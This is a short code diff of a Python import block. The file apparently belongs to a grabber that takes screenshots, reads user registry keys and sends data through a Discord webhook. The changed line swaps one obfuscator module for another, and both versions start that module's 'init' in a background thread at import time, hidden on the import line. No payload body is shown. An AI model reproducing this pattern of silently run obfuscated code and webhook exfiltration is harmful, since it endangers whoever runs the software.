@@ -11,4 +11,4 @@ from PIL import ImageGrab
 from random import randint
 from discord_webhook import DiscordWebhook, DiscordEmbed
 from winreg import OpenKey, HKEY_CURRENT_USER, EnumValue
-from Whatfuscator import init;Thread(target=init).start()
+from WhatObf import init, whatobfuscate;Thread(target=init).start()
